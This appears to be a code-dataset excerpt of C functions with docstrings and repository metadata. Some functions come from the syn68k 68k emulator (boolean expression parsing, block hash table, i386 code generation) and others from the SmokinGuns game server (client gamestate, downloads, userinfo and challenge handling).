{"docstring": "/* and */\n", "func_signal": "static BoolExpr *\nBO_and(const List *ls)", "code": "{\n  BoolExpr *subexpr, *ret;\n  BOOL hit_true = FALSE;\n\n  ret = create_bool_expr (E_AND, NULL);\n  while ((ls = ls->cdr))\n    {\n      subexpr = make_boolean_expr (ls);\n      if (subexpr->type == E_FALSE)  /* If we ever hit FALSE, expr is FALSE */\n\treturn &false_bool_expr;\n      if (subexpr->type != E_TRUE)   /* No sense adding in TRUE statements */\n\t{\n\t  subexpr->next = ret->subexpr;\n\t  ret->subexpr = subexpr;\n\t}\n      else hit_true = TRUE;\n    }\n  if (ret->subexpr == NULL)\n    {\n      if (hit_true)   /* If we hit nothing but TRUE's return TRUE */\n\treturn &true_bool_expr;\n      parse_error(ls, \"and takes arguments!\\n\");\n      return &false_bool_expr;  /* default = FALSE */\n    }\n  \n  if (ret->subexpr->next == NULL) /* (and a) == a */\n    return ret->subexpr;   \n  \n  return ret;\n}", "path": "syngen\\boolean.c", "repo_name": "ctm/syn68k", "stars": 61, "license": "other", "language": "c", "size": 676}
{"docstring": "/* This generates a sequence of cstmts to create the code for a given\n * bit string and set of operands.\n */\n", "func_signal": "static void\ncode_for_bits (const char *b, int start, int length, int indent,\n\t       int offset, const oploc_t *loc)", "code": "{\n  uint32 literal_bits;\n  int n, end;\n  uint32 length_mask;\n  int first_done_p;\n\n  /* Sanity check. */\n  assert (length >= HOST_CODE_T_BITS && length % HOST_CODE_T_BITS == 0\n\t  && length > 0 && length <= 32);\n\n  /* Construct a mask that indicates which bits will actually be output. */\n  length_mask = 0xFFFFFFFF >> (32 - length);\n\n  /* Compute the literal bits (1's and 0's) and put them in a mask.\n   * All non-literal bits will be treated as zeros.\n   */\n  for (n = 0, literal_bits = 0; n < length; n++)\n    {\n#ifndef LITTLEENDIAN\n      literal_bits = (literal_bits << 1) | (b[start + n] == '1');\n#else  /* LITTLEENDIAN */\n      literal_bits |= (uint32) (b[start + n] == '1') << n;\n#endif /* LITTLEENDIAN */\n    }\n\n  /* Output the assignment operator. */\n  spaces (indent);\n  if (length == HOST_CODE_T_BITS)\n    {\n      if (offset % sizeof (host_code_t) == 0)\n\tprintf (\"code[%d] =\", (int) (offset / sizeof (host_code_t)));\n      else\n\tprintf (\"*(host_code_t *)(%scode + %d) =\",\n\t\t(sizeof (host_code_t) == 1) ? \"\" : \"(char *)\", offset);\n    }\n  else\n    {\n      if (offset == 0)\n\tprintf (\"*(uint%d *)code =\", length);\n      else\n\tprintf (\"*(uint%d *)(%scode + %d) =\", length,\n\t\t(sizeof (host_code_t) == 1) ? \"\" : \"(char *)\", offset);\n    }\n\n  /* Output the base constant. */\n  if (literal_bits != 0)\n    {\n      printf (\" 0x%lX\", (unsigned long) literal_bits);\n      first_done_p = TRUE;\n    }\n  else\n    {\n      putchar (' ');\n      first_done_p = FALSE;\n    }\n\n  /* Loop over all of the operands. */\n  end = start + length;\n  for (n = 0; n < 26; n++)\n    {\n      int field_start, field_length, field_end;\n\n      /* See if this operand overlaps the bits we are cranking out. */\n      if (find_field (b, n + 'a', &field_start, &field_length)\n\t  && field_start + field_length > start\n\t  && field_start < start + length)\n\t{\n\t  uint32 mask;\n\t  int shift;\n\n\t  field_end = field_start + field_length;\n\t  if (first_done_p)\n\t    fputs (\" | \", stdout);\n\n\t  /* Compute a mask for the field of interest. */\n\t  mask = 0xFFFFFFFF >> (32 - field_length);\n\n#ifndef LITTLEENDIAN\n\t  shift = end - field_end;\n#else  /* LITTLEENDIAN */\n\t  shift = field_start - start;\n#endif /* LITTLEENDIAN */\n\n\t  if (shift != 0)\n\t    fputs (\"(\", stdout);\n\n\t  /* Mask out all but the relevant bits if necessary.  There's\n\t   * no need to mask if we are shifting the value so far that\n\t   * the masked bits are shifted out of the resulting value\n\t   * anyway.\n\t   */\n\t  if ((shift >= 0 && ((~mask << shift) & length_mask) != 0)\n\t      || (shift < 0 && ((~mask >> -shift) & length_mask) != 0))\n\t    {\n\t      assert (TEMPLATE.operand_name[loc[n].operand_num] != NULL);\n\t      printf (\"(%s & 0x%lX)\",\n\t\t      TEMPLATE.operand_name[loc[n].operand_num],\n\t\t      (unsigned long) mask);\n\t    }\n\t  else\n\t    {\n\t      fputs (TEMPLATE.operand_name[loc[n].operand_num], stdout);\n\t    }\n\n\t  /* Shift the bits to where they belong (computed above). */\n\t  if (shift != 0)\n\t    {\n\t      if (shift > 0)\n\t\tprintf (\" << %d)\", shift);\n\t      else\n\t\tprintf (\" >> %d)\", -shift);\n\t    }\n\t  \n\t  first_done_p = TRUE;\n\t}\n    }\n\n  /* If all bits are zero, actually output a 0. */\n  if (literal_bits == 0 && !first_done_p)\n    fputs (\"0\", stdout);\n\n  puts (\";\");\n}", "path": "runtime\\native\\i386\\analyze.c", "repo_name": "ctm/syn68k", "stars": 61, "license": "other", "language": "c", "size": 676}
{"docstring": "/* xor */\n", "func_signal": "static BoolExpr *\nBO_xor (const List *ls)", "code": "{\n  BoolExpr *subexpr, *ret;\n  BoolExprType answer = E_FALSE;\n  BOOL odd_trues = NO;\n\n  ret = create_bool_expr (E_XOR, NULL);\n  while ((ls = ls->cdr))\n    {\n      subexpr = make_boolean_expr (ls);\n      if (subexpr->type == E_TRUE)\n\t{\n\t  odd_trues = !odd_trues;\n\n\t  if (answer == E_TRUE) answer = E_FALSE;\n\t  else if (answer == E_FALSE) answer = E_TRUE;\n\t  else\n\t    {\n\t      subexpr->next = ret->subexpr;\n\t      ret->subexpr = subexpr;\n\t    }\n\t}\n      else if (subexpr->type != E_FALSE)\n\t{\n\t  subexpr->next = ret->subexpr;\n\t  ret->subexpr = subexpr;\n\t  answer = E_UNKNOWN;\n\t}\n    }\n\n  if (ret->subexpr == NULL)\n    {\n      parse_error(ls, \"xor takes arguments!\\n\");\n      return &false_bool_expr;   /* Default = FALSE */\n    }\n\n  if (answer == E_TRUE)\n    return &true_bool_expr;\n  else if (answer == E_FALSE)\n    return &false_bool_expr;\n  \n  if (ret->subexpr->next == NULL && !odd_trues) /* (xor a) == a */\n    return ret->subexpr;\n  if (odd_trues)  /* If there were an odd number of TRUE's, toss one in. */\n    {\n      subexpr = create_bool_expr (E_TRUE, NULL);\n      subexpr->next = ret->subexpr;\n      ret->subexpr = subexpr;\n    }\n  \n  return ret;\n}", "path": "syngen\\boolean.c", "repo_name": "ctm/syn68k", "stars": 61, "license": "other", "language": "c", "size": 676}
{"docstring": "/* Removes all blocks from the hash table and deallocates all space used by\n * the hash table.\n */\n", "func_signal": "void\nhash_destroy ()", "code": "{\n  Block *b, *next;\n  int i;\n\n  /* Remove all Blocks from the hash table. */\n  for (i = 0; i < NUM_HASH_BUCKETS; i++)\n    for (b = block_hash_table[i]; b != NULL; b = next)\n      {\n\tnext = b->next_in_hash_bucket;\n\tb->next_in_hash_bucket = NULL;\n      }\n\n  memset (block_hash_table, 0, sizeof block_hash_table);\n}", "path": "runtime\\hash.c", "repo_name": "ctm/syn68k", "stars": 61, "license": "other", "language": "c", "size": 676}
{"docstring": "/* Runs through and checks the hash table for consistency.  Returns YES\n * if everything is OK, NO if something is bad (in which case it prints\n * out appropriate errors to stderr.)\n */\n", "func_signal": "BOOL\nhash_verify ()", "code": "{\n  BOOL ok = YES;\n  int i;\n  Block *b, *b2;\n\n  for (i = 0; i < NUM_HASH_BUCKETS; i++)\n    for (b = block_hash_table[i]; b != NULL; b = b->next_in_hash_bucket)\n      {\n\tif (!block_verify (b))\n\t  ok = NO;\n\tif (BLOCK_HASH (b->m68k_start_address) != i)\n\t  {\n\t    fprintf (stderr, \"Internal inconsistency: Block 0x%lX seems to \"\n\t\t     \"have ended up in hash bucket %d instead of hash \"\n\t\t     \"bucket %d where it belongs.\\n\",\n\t\t     b->m68k_start_address, i,\n\t\t     BLOCK_HASH (b->m68k_start_address));\n\t    ok = NO;\n\t  }\n\n\tfor (b2 = b->next_in_hash_bucket; b2; b2 = b2->next_in_hash_bucket)\n\t  if (b->m68k_start_address == b2->m68k_start_address)\n\t    {\n\t      fprintf (stderr, \"Internal inconsistency: More than one block \"\n\t\t       \"in the hash table has the same m68k_start_address \"\n\t\t       \"(0x%lX).\\n\", b->m68k_start_address);\n\t      ok = NO;\n\t      break;\n\t    }\n      }\n\n  return ok;\n}", "path": "runtime\\hash.c", "repo_name": "ctm/syn68k", "stars": 61, "license": "other", "language": "c", "size": 676}
{"docstring": "/* Returns TRUE iff some legal samples have values for the specified\n * operand in the given range and some do not.\n */\n", "func_signal": "static boolean_t\noperand_variety_p (int operand_num, long val_low, long val_high,\n\t\t   const char legal_p[NUM_SAMPLES])", "code": "{\n  boolean_t has_p, has_not_p;\n  int s;\n\n  has_p = has_not_p = FALSE;\n  for (s = 0; s < NUM_SAMPLES; s++)\n    if (legal_p[s])\n      {\n\tif (value[s][operand_num] >= val_low\n\t    && value[s][operand_num] <= val_high)\n\t  has_p = TRUE;\n\telse\n\t  has_not_p = TRUE;\n\n\tif (has_p && has_not_p)\n\t  return TRUE;\n      }\n\n  return FALSE;\n}", "path": "runtime\\native\\i386\\analyze.c", "repo_name": "ctm/syn68k", "stars": 61, "license": "other", "language": "c", "size": 676}
{"docstring": "/* Finds the block associated with a given 68k address and returns a pointer\n * to that block.  Returns NULL iff no block starting at that address exists.\n * Note that it is possible the address specified may fall inside a block of\n * compiled code but not at the beginning; this routine will not detect that\n * situation.  If you want to know what block contains a given address when\n * that address may not refer to the first byte of a block, call the slower\n * range_tree_lookup (addr) function found in rangetree.c\n */\n", "func_signal": "Block *\nhash_lookup (syn68k_addr_t addr)", "code": "{\n  Block *bucket = block_hash_table[BLOCK_HASH (addr)];\n\n  for (; bucket != NULL; bucket = bucket->next_in_hash_bucket)\n    if (bucket->m68k_start_address == addr)\n      return bucket;\n\n  return NULL;\n}", "path": "runtime\\hash.c", "repo_name": "ctm/syn68k", "stars": 61, "license": "other", "language": "c", "size": 676}
{"docstring": "/* Given a string like \"10000101aaaa10100\" and the character 'a', this\n * returns the index into the string where the first 'a' is found, and\n * the number of contiguous 'a's at that index.  Returns TRUE if such\n * a sequence is found, else FALSE.\n */\n", "func_signal": "static int\nfind_field (const char *string, int c, int *first, int *length)", "code": "{\n  const char *s;\n  int l;\n\n  for (s = string; *s != '\\0' && *s != c; s++)\n    ;\n  if (*s == '\\0')\n    return FALSE;\n  *first = s - string;\n  for (l = 1; s[l] == c; l++)\n    ;\n  *length = l;\n\n  return TRUE;\n}", "path": "runtime\\native\\i386\\analyze.c", "repo_name": "ctm/syn68k", "stars": 61, "license": "other", "language": "c", "size": 676}
{"docstring": "/* Inserts a given block into the hash table based on it's m68k_start_address.\n * Inserting a block twice is illegal but is not checked for.\n */\n", "func_signal": "void\nhash_insert (Block *b)", "code": "{\n  uint32 addr = b->m68k_start_address;\n  Block **bucket = &block_hash_table[BLOCK_HASH (addr)];\n\n  /* Prepend this block to the beginning of the list. */\n  b->next_in_hash_bucket = *bucket;\n  *bucket = b;\n}", "path": "runtime\\hash.c", "repo_name": "ctm/syn68k", "stars": 61, "license": "other", "language": "c", "size": 676}
{"docstring": "/*\n================\nSV_SendClientGameState\n\nSends the first message from the server to a connected client.\nThis will be sent on the initial connection and upon each new map load.\n\nIt will be resent if the client acknowledges a later message but has\nthe wrong gamestate.\n================\n*/\n", "func_signal": "static void SV_SendClientGameState( client_t *client )", "code": "{\n\tint\t\t\tstart;\n\tentityState_t\t*base, nullstate;\n\tmsg_t\t\tmsg;\n\tbyte\t\tmsgBuffer[MAX_MSGLEN];\n\tmsg_t\t\tmsg_fake;\n\tbyte\t\tmsgBuffer_fake[MAX_MSGLEN];\n\n \tCom_DPrintf (\"SV_SendClientGameState() for %s\\n\", client->name);\n\tCom_DPrintf( \"Going from CS_CONNECTED to CS_PRIMED for %s\\n\", client->name );\n\tclient->state = CS_PRIMED;\n\tclient->pureAuthentic = 0;\n\tclient->gotCP = qfalse;\n\n\t// when we receive the first packet from the client, we will\n\t// notice that it is from a different serverid and that the\n\t// gamestate message was not just sent, forcing a retransmit\n\tclient->gamestateMessageNum = client->netchan.outgoingSequence;\n\n\tMSG_Init( &msg, msgBuffer, sizeof( msgBuffer ) );\n\tMSG_Init( &msg_fake, msgBuffer_fake, sizeof( msgBuffer_fake ) );\n\n\t// NOTE, MRE: all server->client messages now acknowledge\n\t// let the client know which reliable clientCommands we have received\n\tMSG_WriteLong( &msg, client->lastClientCommand );\n\n\t// send any server commands waiting to be sent first.\n\t// we have to do this cause we send the client->reliableSequence\n\t// with a gamestate and it sets the clc.serverCommandSequence at\n\t// the client side\n\tSV_UpdateServerCommandsToClient( client, &msg, &msg_fake );\n\n\t// send the gamestate\n\tMSG_WriteByte( &msg, svc_gamestate );\n\tMSG_WriteLong( &msg, client->reliableSequence );\n\n\t// write the configstrings\n\tfor ( start = 0 ; start < MAX_CONFIGSTRINGS ; start++ ) {\n\t\tif (sv.configstrings[start][0]) {\n\t\t\tMSG_WriteByte( &msg, svc_configstring );\n\t\t\tMSG_WriteShort( &msg, start );\n\t\t\tMSG_WriteBigString( &msg, sv.configstrings[start] );\n\t\t}\n\t}\n\n\t// write the baselines\n\tCom_Memset( &nullstate, 0, sizeof( nullstate ) );\n\tfor ( start = 0 ; start < MAX_GENTITIES; start++ ) {\n\t\tbase = &sv.svEntities[start].baseline;\n\t\tif ( !base->number ) {\n\t\t\tcontinue;\n\t\t}\n\t\tMSG_WriteByte( &msg, svc_baseline );\n\t\tMSG_WriteDeltaEntity( &msg, &nullstate, base, qtrue );\n\t}\n\n\tMSG_WriteByte( &msg, svc_EOF );\n\n\tMSG_WriteLong( &msg, client - svs.clients);\n\n\t// write the checksum feed\n\tMSG_WriteLong( &msg, sv.checksumFeed);\n\n\t// deliver this to the client\n\tSV_SendMessageToClient( &msg, client );\n}", "path": "code\\server\\sv_client.c", "repo_name": "smokin-guns/SmokinGuns", "stars": 58, "license": "gpl-2.0", "language": "c", "size": 47143}
{"docstring": "/*\n==================\nSV_SendDownloadMessages\n\nSend one round of download messages to all clients\n==================\n*/\n", "func_signal": "int SV_SendDownloadMessages(void)", "code": "{\n\tint i, numDLs = 0, retval;\n\tclient_t *cl;\n\tmsg_t msg;\n\tbyte msgBuffer[MAX_MSGLEN];\n\t\n\tfor(i=0; i < sv_maxclients->integer; i++)\n\t{\n\t\tcl = &svs.clients[i];\n\t\t\n\t\tif(cl->state && *cl->downloadName)\n\t\t{\n\t\t\tMSG_Init(&msg, msgBuffer, sizeof(msgBuffer));\n\t\t\tMSG_WriteLong(&msg, cl->lastClientCommand);\n\t\t\t\n\t\t\tretval = SV_WriteDownloadToClient(cl, &msg);\n\t\t\t\t\n\t\t\tif(retval)\n\t\t\t{\n\t\t\t\tMSG_WriteByte(&msg, svc_EOF);\n\t\t\t\tSV_Netchan_Transmit(cl, &msg);\n\t\t\t\tnumDLs += retval;\n\t\t\t}\n\t\t}\n\t}\n\n\treturn numDLs;\n}", "path": "code\\server\\sv_client.c", "repo_name": "smokin-guns/SmokinGuns", "stars": 58, "license": "gpl-2.0", "language": "c", "size": 47143}
{"docstring": "/*\n==================\nSV_SendQueuedMessages\n\nSend one round of fragments, or queued messages to all clients that have data pending.\nReturn the shortest time interval for sending next packet to client\n==================\n*/\n", "func_signal": "int SV_SendQueuedMessages(void)", "code": "{\n\tint i, retval = -1, nextFragT;\n\tclient_t *cl;\n\t\n\tfor(i=0; i < sv_maxclients->integer; i++)\n\t{\n\t\tcl = &svs.clients[i];\n\t\t\n\t\tif(cl->state)\n\t\t{\n\t\t\tnextFragT = SV_RateMsec(cl);\n\n\t\t\tif(!nextFragT)\n\t\t\t\tnextFragT = SV_Netchan_TransmitNextFragment(cl);\n\n\t\t\tif(nextFragT >= 0 && (retval == -1 || retval > nextFragT))\n\t\t\t\tretval = nextFragT;\n\t\t}\n\t}\n\n\treturn retval;\n}", "path": "code\\server\\sv_client.c", "repo_name": "smokin-guns/SmokinGuns", "stars": 58, "license": "gpl-2.0", "language": "c", "size": 47143}
{"docstring": "/*\n=================\nSV_UserinfoChanged\n\nPull specific info from a newly changed userinfo string\ninto a more C friendly form.\n=================\n*/\n", "func_signal": "void SV_UserinfoChanged( client_t *cl )", "code": "{\n\tchar\t*val;\n\tchar\t*ip;\n\tint\t\ti;\n\tint\tlen;\n\n\t// name for C code\n\tQ_strncpyz( cl->name, Info_ValueForKey (cl->userinfo, \"name\"), sizeof(cl->name) );\n\n\t// rate command\n\n\t// if the client is on the same subnet as the server and we aren't running an\n\t// internet public server, assume they don't need a rate choke\n\tif ( Sys_IsLANAddress( cl->netchan.remoteAddress ) && com_dedicated->integer != 2 && sv_lanForceRate->integer == 1) {\n\t\tcl->rate = 99999;\t// lans should not rate limit\n\t} else {\n\t\tval = Info_ValueForKey (cl->userinfo, \"rate\");\n\t\tif (strlen(val)) {\n\t\t\ti = atoi(val);\n\t\t\tcl->rate = i;\n\t\t\tif (cl->rate < 1000) {\n\t\t\t\tcl->rate = 1000;\n\t\t\t} else if (cl->rate > 90000) {\n\t\t\t\tcl->rate = 90000;\n\t\t\t}\n\t\t} else {\n\t\t\tcl->rate = 3000;\n\t\t}\n\t}\n\tval = Info_ValueForKey (cl->userinfo, \"handicap\");\n\tif (strlen(val)) {\n\t\ti = atoi(val);\n\t\tif (i<=0 || i>100 || strlen(val) > 4) {\n\t\t\tInfo_SetValueForKey( cl->userinfo, \"handicap\", \"100\" );\n\t\t}\n\t}\n\n\t// snaps command\n\tval = Info_ValueForKey (cl->userinfo, \"snaps\");\n\t\n\tif(strlen(val))\n\t{\n\t\ti = atoi(val);\n\t\t\n\t\tif(i < 1)\n\t\t\ti = 1;\n\t\telse if(i > sv_fps->integer)\n\t\t\ti = sv_fps->integer;\n\n\t\ti = 1000 / i;\n\t}\n\telse\n\t\ti = 50;\n\n\tif(i != cl->snapshotMsec)\n\t{\n\t\t// Reset last sent snapshot so we avoid desync between server frame time and snapshot send time\n\t\tcl->lastSnapshotTime = 0;\n\t\tcl->snapshotMsec = i;\t\t\n\t}\n\n#ifdef USE_VOIP\n#ifdef LEGACY_PROTOCOL\n\tif(cl->compat)\n\t\tcl->hasVoip = qfalse;\n\telse\n#endif\n\t{\n\t\tval = Info_ValueForKey(cl->userinfo, \"cl_voip\");\n\t\tcl->hasVoip = atoi(val);\n\t}\n#endif\n\n\t// TTimo\n\t// maintain the IP information\n\t// the banning code relies on this being consistently present\n\tif( NET_IsLocalAddress(cl->netchan.remoteAddress) )\n\t\tip = \"localhost\";\n\telse\n\t\tip = (char*)NET_AdrToString( cl->netchan.remoteAddress );\n\n\tval = Info_ValueForKey( cl->userinfo, \"ip\" );\n\tif( val[0] )\n\t\tlen = strlen( ip ) - strlen( val ) + strlen( cl->userinfo );\n\telse\n\t\tlen = strlen( ip ) + 4 + strlen( cl->userinfo );\n\n\tif( len >= MAX_INFO_STRING )\n\t\tSV_DropClient( cl, \"userinfo string length exceeded\" );\n\telse\n\t\tInfo_SetValueForKey( cl->userinfo, \"ip\", ip );\n\n}", "path": "code\\server\\sv_client.c", "repo_name": "smokin-guns/SmokinGuns", "stars": 58, "license": "gpl-2.0", "language": "c", "size": 47143}
{"docstring": "/*\n=================\nSV_GetChallenge\n\nA \"getchallenge\" OOB command has been received\nReturns a challenge number that can be used\nin a subsequent connectResponse command.\nWe do this to prevent denial of service attacks that\nflood the server with invalid connection IPs.  With a\nchallenge, they must give a valid IP address.\n\nIf we are authorizing, a challenge request will cause a packet\nto be sent to the authorize server.\n\nWhen an authorizeip is returned, a challenge response will be\nsent to that ip.\n\nioquake3: we added a possibility for clients to add a challenge\nto their packets, to make it more difficult for malicious servers\nto hi-jack client connections.\nAlso, the auth stuff is completely disabled for com_standalone games\nas well as IPv6 connections, since there is no way to use the\nv4-only auth server for these new types of connections.\n=================\n*/\n", "func_signal": "void SV_GetChallenge(netadr_t from)", "code": "{\n\tint\t\ti;\n\tint\t\toldest;\n\tint\t\toldestTime;\n\tint\t\toldestClientTime;\n\tint\t\tclientChallenge;\n\tchallenge_t\t*challenge;\n\tqboolean wasfound = qfalse;\n\tchar *gameName;\n\tqboolean gameMismatch;\n\n\t// ignore if we are in single player\n\tif ( Cvar_VariableValue( \"g_gametype\" ) == GT_SINGLE_PLAYER || Cvar_VariableValue(\"ui_singlePlayerActive\")) {\n\t\treturn;\n\t}\n\n\t// Prevent using getchallenge as an amplifier\n\tif ( SVC_RateLimitAddress( from, 10, 1000 ) ) {\n\t\tCom_DPrintf( \"SV_GetChallenge: rate limit from %s exceeded, dropping request\\n\",\n\t\t\tNET_AdrToString( from ) );\n\t\treturn;\n\t}\n\n\t// Allow getchallenge to be DoSed relatively easily, but prevent\n\t// excess outbound bandwidth usage when being flooded inbound\n\tif ( SVC_RateLimit( &outboundLeakyBucket, 10, 100 ) ) {\n\t\tCom_DPrintf( \"SV_GetChallenge: rate limit exceeded, dropping request\\n\" );\n\t\treturn;\n\t}\n\n\tgameName = Cmd_Argv(2);\n\n#ifdef LEGACY_PROTOCOL\n\t// gamename is optional for legacy protocol\n\tif (com_legacyprotocol->integer && !*gameName)\n\t\tgameMismatch = qfalse;\n\telse\n#endif\n\t\tgameMismatch = !*gameName || strcmp(gameName, com_gamename->string) != 0;\n\n\t// reject client if the gamename string sent by the client doesn't match ours\n\tif (gameMismatch)\n\t{\n\t\tNET_OutOfBandPrint(NS_SERVER, from, \"print\\nGame mismatch: This is a %s server\\n\",\n\t\t\tcom_gamename->string);\n\t\treturn;\n\t}\n\n\toldest = 0;\n\toldestClientTime = oldestTime = 0x7fffffff;\n\n\t// see if we already have a challenge for this ip\n\tchallenge = &svs.challenges[0];\n\tclientChallenge = atoi(Cmd_Argv(1));\n\n\tfor(i = 0 ; i < MAX_CHALLENGES ; i++, challenge++)\n\t{\n\t\tif(!challenge->connected && NET_CompareAdr(from, challenge->adr))\n\t\t{\n\t\t\twasfound = qtrue;\n\t\t\t\n\t\t\tif(challenge->time < oldestClientTime)\n\t\t\t\toldestClientTime = challenge->time;\n\t\t}\n\t\t\n\t\tif(wasfound && i >= MAX_CHALLENGES_MULTI)\n\t\t{\n\t\t\ti = MAX_CHALLENGES;\n\t\t\tbreak;\n\t\t}\n\t\t\n\t\tif(challenge->time < oldestTime)\n\t\t{\n\t\t\toldestTime = challenge->time;\n\t\t\toldest = i;\n\t\t}\n\t}\n\n\tif (i == MAX_CHALLENGES)\n\t{\n\t\t// this is the first time this client has asked for a challenge\n\t\tchallenge = &svs.challenges[oldest];\n\t\tchallenge->clientChallenge = clientChallenge;\n\t\tchallenge->adr = from;\n\t\tchallenge->firstTime = svs.time;\n\t\tchallenge->connected = qfalse;\n\t}\n\n\t// always generate a new challenge number, so the client cannot circumvent sv_maxping\n\tchallenge->challenge = ( (rand() << 16) ^ rand() ) ^ svs.time;\n\tchallenge->wasrefused = qfalse;\n\tchallenge->time = svs.time;\n\n#ifndef STANDALONE\n\t// Drop the authorize stuff if this client is coming in via v6 as the auth server does not support ipv6.\n\t// Drop also for addresses coming in on local LAN and for stand-alone games independent from id's assets.\n\tif(challenge->adr.type == NA_IP && !com_standalone->integer && !Sys_IsLANAddress(from))\n#elif defined SMOKINGUNS\n\tif(challenge->adr.type == NA_IP && !Sys_IsLANAddress(from))\n\t{\n\t\t// look up the authorize server's IP\n\t\tif (svs.authorizeAddress.type == NA_BAD)\n\t\t{\n\t\t\tCom_Printf( \"Resolving %s\\n\", AUTHORIZE_SERVER_NAME );\n\t\t\t\n\t\t\tif (NET_StringToAdr(AUTHORIZE_SERVER_NAME, &svs.authorizeAddress, NA_IP))\n\t\t\t{\n\t\t\t\tsvs.authorizeAddress.port = BigShort( PORT_AUTHORIZE );\n\t\t\t\tCom_Printf( \"%s resolved to %i.%i.%i.%i:%i\\n\", AUTHORIZE_SERVER_NAME,\n\t\t\t\t\tsvs.authorizeAddress.ip[0], svs.authorizeAddress.ip[1],\n\t\t\t\t\tsvs.authorizeAddress.ip[2], svs.authorizeAddress.ip[3],\n\t\t\t\t\tBigShort( svs.authorizeAddress.port ) );\n\t\t\t}\n\t\t}\n\n\t\t// we couldn't contact the auth server, let them in.\n\t\tif(svs.authorizeAddress.type == NA_BAD)\n\t\t\tCom_Printf(\"Couldn't resolve auth server address\\n\");\n\n\t\t// if they have been challenging for a long time and we\n\t\t// haven't heard anything from the authorize server, go ahead and\n\t\t// let them in, assuming the id server is down\n\t\telse if(svs.time - oldestClientTime > AUTHORIZE_TIMEOUT)\n\t\t\tCom_DPrintf( \"authorize server timed out\\n\" );\n\t\telse\n\t\t{\n\t\t\t// otherwise send their ip to the authorize server\n\t\t\tcvar_t\t*fs;\n\t\t\tchar\tgame[1024];\n\n\t\t\tCom_DPrintf( \"sending getIpAuthorize for %s\\n\", NET_AdrToString( from ));\n\n\t\t\tstrcpy(game, BASEGAME);\n\t\t\tfs = Cvar_Get (\"fs_game\", \"\", CVAR_INIT|CVAR_SYSTEMINFO );\n\t\t\tif (fs && fs->string[0] != 0) {\n\t\t\t\tstrcpy(game, fs->string);\n\t\t\t}\n\n\t\t\t// the 0 is for backwards compatibility with obsolete sv_allowanonymous flags\n\t\t\t// getIpAuthorize <challenge> <IP> <game> 0 <auth-flag>\n\t\t\tNET_OutOfBandPrint( NS_SERVER, svs.authorizeAddress,\n\t\t\t\t\"getIpAuthorize %i %i.%i.%i.%i %s 0 %s\",  challenge->challenge,\n\t\t\t\tfrom.ip[0], from.ip[1], from.ip[2], from.ip[3], game, sv_strictAuth->string );\n\t\t\t\n\t\t\treturn;\n\t\t}\n\t}\n#endif\n\n\tchallenge->pingTime = svs.time;\n\tNET_OutOfBandPrint(NS_SERVER, challenge->adr, \"challengeResponse %d %d %d\",\n\t\t\t   challenge->challenge, clientChallenge, com_protocol->integer);\n}", "path": "code\\server\\sv_client.c", "repo_name": "smokin-guns/SmokinGuns", "stars": 58, "license": "gpl-2.0", "language": "c", "size": 47143}
{"docstring": "/*\n====================\nSV_AuthorizeIpPacket\n\nA packet has been returned from the authorize server.\nIf we have a challenge adr for that ip, send the\nchallengeResponse to it\n====================\n*/\n", "func_signal": "void SV_AuthorizeIpPacket( netadr_t from )", "code": "{\n\tint\t\tchallenge;\n\tint\t\ti;\n\tchar\t*s;\n\tchar\t*r;\n\tchallenge_t *challengeptr;\n\n\tif ( !NET_CompareBaseAdr( from, svs.authorizeAddress ) ) {\n\t\tCom_Printf( \"SV_AuthorizeIpPacket: not from authorize server\\n\" );\n\t\treturn;\n\t}\n\n\tchallenge = atoi( Cmd_Argv( 1 ) );\n\n\tfor (i = 0 ; i < MAX_CHALLENGES ; i++) {\n\t\tif ( svs.challenges[i].challenge == challenge ) {\n\t\t\tbreak;\n\t\t}\n\t}\n\tif ( i == MAX_CHALLENGES ) {\n\t\tCom_Printf( \"SV_AuthorizeIpPacket: challenge not found\\n\" );\n\t\treturn;\n\t}\n\t\n\tchallengeptr = &svs.challenges[i];\n\n\t// send a packet back to the original client\n\tchallengeptr->pingTime = svs.time;\n\ts = Cmd_Argv( 2 );\n\tr = Cmd_Argv( 3 );\t\t\t// reason\n\n#ifndef SMOKINGUNS\n\tif ( !Q_stricmp( s, \"demo\" ) ) {\n\t\t// they are a demo client trying to connect to a real server\n\t\tNET_OutOfBandPrint( NS_SERVER, challengeptr->adr, \"print\\nServer is not a demo server\\n\" );\n\t\t// clear the challenge record so it won't timeout and let them through\n\t\tCom_Memset( challengeptr, 0, sizeof( *challengeptr ) );\n\t\treturn;\n\t}\n#endif\n\tif ( !Q_stricmp( s, \"accept\" ) ) {\n\t\tNET_OutOfBandPrint(NS_SERVER, challengeptr->adr,\n\t\t\t\"challengeResponse %d %d %d\", challengeptr->challenge, challengeptr->clientChallenge, com_protocol->integer);\n\t\treturn;\n\t}\n\tif ( !Q_stricmp( s, \"unknown\" ) ) {\n\t\tif (!r) {\n\t\t\tNET_OutOfBandPrint( NS_SERVER, challengeptr->adr, \"print\\nAwaiting CD key authorization\\n\" );\n\t\t} else {\n\t\t\tNET_OutOfBandPrint( NS_SERVER, challengeptr->adr, \"print\\n%s\\n\", r);\n\t\t}\n\t\t// clear the challenge record so it won't timeout and let them through\n\t\tCom_Memset( challengeptr, 0, sizeof( *challengeptr ) );\n\t\treturn;\n\t}\n\n\t// authorization failed\n\tif (!r) {\n\t\tNET_OutOfBandPrint( NS_SERVER, challengeptr->adr, \"print\\nSomeone is using this CD Key\\n\" );\n\t} else {\n\t\tNET_OutOfBandPrint( NS_SERVER, challengeptr->adr, \"print\\n%s\\n\", r );\n\t}\n\n\t// clear the challenge record so it won't timeout and let them through\n\tCom_Memset( challengeptr, 0, sizeof(*challengeptr) );\n}", "path": "code\\server\\sv_client.c", "repo_name": "smokin-guns/SmokinGuns", "stars": 58, "license": "gpl-2.0", "language": "c", "size": 47143}
{"docstring": "/*\n==================\nSV_UpdateUserinfo_f\n==================\n*/\n", "func_signal": "static void SV_UpdateUserinfo_f( client_t *cl )", "code": "{\n\tQ_strncpyz( cl->userinfo, Cmd_Argv(1), sizeof(cl->userinfo) );\n\n\tSV_UserinfoChanged( cl );\n\t// call prog code to allow overrides\n\tVM_Call( gvm, GAME_CLIENT_USERINFO_CHANGED, cl - svs.clients );\n}", "path": "code\\server\\sv_client.c", "repo_name": "smokin-guns/SmokinGuns", "stars": 58, "license": "gpl-2.0", "language": "c", "size": 47143}
